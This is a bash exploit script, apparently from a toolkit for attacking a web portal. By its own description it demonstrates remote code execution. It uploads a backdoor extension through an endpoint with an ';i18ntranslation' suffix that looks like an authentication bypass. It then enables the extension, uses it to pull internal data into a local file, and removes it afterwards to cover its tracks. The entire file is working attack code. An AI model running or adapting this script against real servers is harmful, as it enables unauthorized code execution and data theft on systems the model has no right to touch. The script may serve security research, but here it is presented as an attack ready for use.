#!/bin/bash
# Demonstrates Remote Code Execution on target server.
# bash ./abp-ext-upload.sh
source "$(dirname "$0")/_const.sh"
set -e
print_header "Upload BD extension and retrieve data"
print_configuration
print_dash_line

echo "Uploading extension.."

# Make the request and store the response
UPLOAD_RESPONSE=$(curl -s -X "POST" "${BN_SERVER_URL}/portal/pageUpload;i18ntranslation?action=add" \
    -H 'Content-Type: multipart/form-data; charset=utf-8; boundary=__X_PAW_BOUNDARY__' \
    -H "Cookie: ${BN_SESS_COOKIE}" \
    -F "file=@${FILE_IN_BN_EXT_BD_TYPES}")

# Get the filename without path
FILE_NAME=$(basename "${FILE_IN_BN_EXT_BD_TYPES}")

 # Check if the response contains the correct filename
if echo "${UPLOAD_RESPONSE}" | grep -q "::${FILE_NAME}::"
then
    # Extract first two parts (everything before the last ::)
    UPLOAD_RESULT=$(echo "${UPLOAD_RESPONSE}" | sed 's/\(.*::.*\)::.*/\1/')
    echo -e "\tUpload successful."
    echo -e "\nEnabling extension..."

    # Second request - enable extension
    ENABLE_RESPONSE=$(curl -s -X "POST" "${URL_SYS_EXT_ENABLE}" \
         -H 'Content-Type: application/json; charset=utf-8' \
         -H "Cookie: ${BN_SESS_COOKIE}" \
         -d "{
      \"pageZip\": \"${UPLOAD_RESULT}\",
      \"formError\": \"\"
    }")

    # Check for either successful response or AlreadyExistsException
    if echo "${ENABLE_RESPONSE}" | grep -q "\"contentName\":\"${FILE_NAME}\""; then
        # Extract ID using jq (if available) or awk
        if command -v jq >/dev/null 2>&1; then
            EXT_ID=$(echo "${ENABLE_RESPONSE}" | jq -r .id)
        else
            EXT_ID=$(echo "${ENABLE_RESPONSE}" | awk -F'"id":"' '{print $2}' | awk -F'"' '{print $1}')
        fi
        echo -e "\tExtension successfully enabled."
    elif echo "${ENABLE_RESPONSE}" | grep -q "AlreadyExistsException"; then
        EXT_ID="1"
        echo -e "\tExtension was already installed."
    else
        echo -e "\tError: Enable response doesn't match expected patterns"
        echo -e "\tResponse was: ${ENABLE_RESPONSE}"
        exit 1
    fi

    echo -e "\nTrying to use extension.."

    DATA=$(curl -s -b "${BN_SESS_COOKIE}" "${URL_SYS_EXT_BD}")
    # Check if curl was successful and data is not empty
    if [ $? -ne 0 ] || [ -z "${DATA}" ]; then
        echo -e "\tFailed to fetch data or received empty response"
        exit 1
    fi

    # Count lines that match the .model. pattern
    MODEL_LINES=$(echo "${DATA}" | grep -c "\.model\.")

    # Check if we have at least one line matching the pattern
    if [ "${MODEL_LINES}" -lt 1 ]; then
        echo -e "\tExpected at least 1 model entry, but found ${MODEL_LINES}"
        echo -e "\tResponse was: ${DATA}"
        exit 1
    fi

# Validate that each line has the correct format
    INVALID_LINES=$(echo "${DATA}" | awk -F"." '!/^[a-zA-Z]/')
    if [ -n "${INVALID_LINES}" ]; then
        echo -e "\tFound invalid format in response:"
        echo -e "${INVALID_LINES}"
        exit 1
    fi

    echo -e "\t Retrieved ${MODEL_LINES} lines"

    TMP_FILE="${DIR_OUT_SYS_BD_TYPE}/downloaded-bd-type.txt"
    touch "${TMP_FILE}" "${FILE_OUT_BD_OBJ}"
    echo -n "${DATA}" > "${TMP_FILE}"

    # Combine parsed data with existing list
    sort -u "${TMP_FILE}" "${FILE_OUT_BD_OBJ}" | printf "%s" "$(cat)" > "${TMP_FILE}.tmp" && mv "${TMP_FILE}.tmp" "${FILE_OUT_BD_OBJ}"

    if [ "${EXT_ID}" -gt 1 ]; then
        echo -e "\nRemoving extension..."
        DEL_URL="${URL_API}/portal/page/${EXT_ID};i18ntranslation"
        DEL_RES=$(curl -s -X DELETE "${DEL_URL}" -b "${BN_SESS_COOKIE}" -w "\n%{http_code}")
        HTTP_CODE=$(echo "${DEL_RES}" | tail -n1)
        if [ "${HTTP_CODE}" -eq 200 ] || [ "${HTTP_CODE}" -eq 204 ]; then
            echo -e "\tExtension removed"
        else
            echo -e "\Failed to remove"
        fi
    fi

else
    echo "Error: Upload response doesn't match expected result"
    echo "Response was: ${UPLOAD_RESPONSE}"
    exit 1
fi